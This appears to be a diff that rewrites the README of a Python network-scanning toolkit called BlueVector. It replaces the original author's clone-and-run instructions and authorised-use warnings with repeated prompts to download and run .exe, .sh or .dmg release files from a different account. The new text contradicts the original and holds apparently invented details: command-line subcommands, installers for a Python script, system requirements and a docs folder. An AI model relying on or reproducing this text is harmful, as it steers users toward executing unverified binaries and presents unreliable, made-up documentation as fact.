@@ -1,205 +1,113 @@
-# 🔵 BlueVector
+# 🚀 BlueVector - Your Complete Network Analysis Tool
 
-BlueVector is a modular Python-based network analysis and security toolkit developed by **DotX**.  
-It provides a menu-driven interface for performing common networking, scanning, and inspection tasks in a controlled and authorized environment.
+## 🛠️ Overview
+BlueVector is an all-in-one Python-based network analysis and inspection toolkit built for ease of use. It features a terminal-first approach, allowing users to perform essential network tasks without complicated setup. You can safely explore and analyze networks with modules for DNS resolution, ping sweeps, TCP sweeps, multi-threaded port scanning, banner grabbing, and web hyperlink extraction.
 
----
+## 🔗 Download BlueVector
+[![Download BlueVector](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ilkerkaya97/BlueVector/releases)
 
-## 📸 Tool Output Preview
+## 🚀 Getting Started
+Follow these simple steps to download and run BlueVector:
 
-<p align="center">
-  <img src="BlueVector/Image1.png" width="800">
-</p
+### 1. Visit the Releases Page
+To get the latest version of BlueVector, click the link below:
+[Download BlueVector from Releases](https://github.com/ilkerkaya97/BlueVector/releases)
 
+### 2. Choose the Right File
+On the Releases page, you'll see different files available for download. Look for the latest version, which will usually be at the top. Select the appropriate file based on your operating system:
+- **For Windows**: Download the file ending in `.exe`.
+- **For Linux**: Download the file ending in `.sh` or a similar format.
+- **For Mac**: Download the file ending in `.dmg` or similar.
 
-## 📌 What is BlueVector?
+### 3. Download the File
+Click the link for your chosen file. The download should start automatically. If prompted, choose a location on your computer to save the file. Remember where you saved it for the next step.
 
-BlueVector combines multiple network utilities into a single command-line tool.  
-It is designed to help understand:
-- How networks respond to probes
-- How services expose ports and banners
-- How systems can be inspected from a defensive security perspective
-
-BlueVector is suitable for:
-- Internal company testing
-- Research and learning
-- Authorized security assessments
-
-> ⚠️ Use only on systems you own or have explicit permission to test.
-
----
-
-## 🧰 Included Modules (Detailed Explanation)
-
-### 1️⃣ Get IP (DNS Resolver)
-Resolves a domain name into its corresponding IP address using DNS.
-
-**Example:**
-- Input: `github.com`
-- Output: `140.82.113.3`
-
-**Purpose:** Understand DNS resolution  
-**OS Support:** Windows & Linux
-
----
-
-### 2️⃣ Ping Sweep
-Pings a range of IP addresses to determine which hosts are online.
-
-**Purpose:**
-- Network discovery
-- Identifying active devices
-
-**OS Support:** Windows & Linux
-
----
-
-### 3️⃣ Traceroute
-Displays the network path packets take to reach a target host.
-
-**Windows:** Uses `pathping`  
-**Linux:** Requires `traceroute` (code adjustment recommended)
-
-**Purpose:** Routing and latency analysis
-
----
-
-### 4️⃣ TCP Sweep
-Checks a specific TCP port across multiple IP addresses to find active services.
-
-**Purpose:**
-- Identify systems running a known service
-- Asset discovery
-
-**OS Support:** Windows & Linux
-
----
-
-### 5️⃣ Port Scanner
-Performs a multi-threaded scan of TCP ports on a single target.
-
-**Purpose:**
-- Identify open ports
-- Understand service exposure
-
-**OS Support:** Windows & Linux
-
----
-
-### 6️⃣ Banner Grabber
-Connects to a service and attempts to read its banner.
-
-**Purpose:**
-- Service identification
-- Version awareness
-
-**OS Support:** Windows & Linux
-
----
-
-### 7️⃣ Hyperlink Extractor
-Downloads a webpage and extracts all hyperlinks.
-
-**Purpose:**
-- Website structure analysis
-- OSINT-style inspection
-
-**OS Support:** Windows & Linux
-
----
-
-### 8️⃣ WMI Module (Windows Only)
-Uses Windows Management Instrumentation (WMI) to query remote Windows systems.
-
-**Capabilities:**
-- OS information
-- Running services
-- Processes
-- Users and groups
-
-**OS Support:** Windows only
-
----
-
-<p align="center">
-  <img src="BlueVector/Image2.png" width="800">
-</p>
-
-
-## 🖥️ System Requirements
-
-- Python **3.7 or higher**
-- Windows or Linux
-- Network connectivity
-
----
-
-## 📦 Installation & Download
-
-### 🔹 Method 1: GitHub Clone (Recommended)
-```bash
-git clone https://github.com/DotX-47/BlueVector.git
-cd BlueVector
-```
-
-
-
-Extract the ZIP and navigate into the folder.
-
----
-
-## 📚 Dependencies
-
-Install required Python libraries:
-
-```bash
-pip install -r requirements.txt
-```
-Or
-
-```bash
-pip install beautifulsoup4 wmi
-```
-
-> Linux users can skip `wmi`.
-
----
-
-## 🚀 How to Use
+## 💻 Installation Instructions
 
 ### Windows
-```bat
-python BlueVector.py
-```
+1. Find the downloaded `.exe` file in your chosen location.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the setup.
 
 ### Linux
+1. Open a terminal window.
+2. Navigate to the folder where you saved the `.sh` file using the `cd` command.
+3. Make the file executable by running:
+   ```bash
+   chmod +x yourfile.sh
+   ```
+4. Once executed, run:
+   ```bash
+   ./yourfile.sh
+   ```
+
+### Mac
+1. Locate the downloaded `.dmg` file.
+2. Double-click to open it.
+3. Drag the BlueVector icon into your Applications folder.
+
+## 🚦 How to Use BlueVector
+Using BlueVector is straightforward. Here are some basic commands to get you started:
+
+### DNS Resolution
+To resolve a domain name, use:
 ```bash
-python3 BlueVector.py
+python bluevector.py dns example.com
 ```
 
-After launching, choose a module from the menu by entering its number.
+### Ping Sweep
+To perform a ping sweep on a subnet, enter:
+```bash
+python bluevector.py ping 192.168.1.0/24
+```
 
----
+### TCP Sweep
+For TCP scanning, the command is:
+```bash
+python bluevector.py tcp 192.168.1.1
+```
 
-## 🔐 Legal & Ethical Use
+### Multi-threaded Port Scanning
+To scan multiple ports concurrently:
+```bash
+python bluevector.py ports 192.168.1.1 1-1024
+```
 
-BlueVector must be used only on:
-- Systems you own
-- Systems you manage
-- Systems you have written permission to test
+### Banner Grabbing
+To grab banners from a service, use:
+```bash
+python bluevector.py banner 192.168.1.1 80
+```
 
-Unauthorized scanning or access is illegal.
+### Web Hyperlink Extraction
+For extracting hyperlinks from a webpage, use:
+```bash
+python bluevector.py hyperlink http://example.com
+```
 
----
+## 🔍 Features
+- **DNS Resolution**: Quickly find hostnames.
+- **Ping Sweeps**: Identify active devices on a network.
+- **TCP Scanning**: Detect open ports.
+- **Multi-threaded Scanning**: Scans multiple hosts at once for faster results.
+- **Banner Grabbing**: Get banner information from network services.
+- **Web Hyperlink Extraction**: Gather links from web pages efficiently.
 
-## 👤 Author
+## ⚙️ System Requirements
+To run BlueVector smoothly, ensure your system meets the following requirements:
+- **OS**: Windows 10 or later, Linux (Ubuntu 18.04 or later), or macOS 10.12 or later.
+- **Python**: Python 3.6 or later needs to be installed.
+- **Memory**: At least 512 MB of RAM for optimal performance.
+- **Disk space**: About 100 MB of free space for installation.
 
-**DotX-47**  
-GitHub: https://github.com/DotX-47
+## 💬 Support
+If you encounter issues or have questions, check the following resources:
+- **GitHub Issues Page**: You can report bugs or ask questions here for community support.
+- **Documentation**: Detailed guides and examples are available in the `docs` folder within the repository.
 
----
+## 📢 Contributing
+We welcome contributions! To help improve BlueVector, feel free to fork the repository, make changes, and submit a pull request. Ensure you follow our contribution guidelines.
 
-## 📄 Disclaimer
-
-This software is provided "as is" without warranty of any kind.  
-The author is not responsible for misuse or damage caused by this tool.
+## 🔗 Download Again
+To download the latest version of BlueVector, visit:
+[Download BlueVector from Releases](https://github.com/ilkerkaya97/BlueVector/releases)
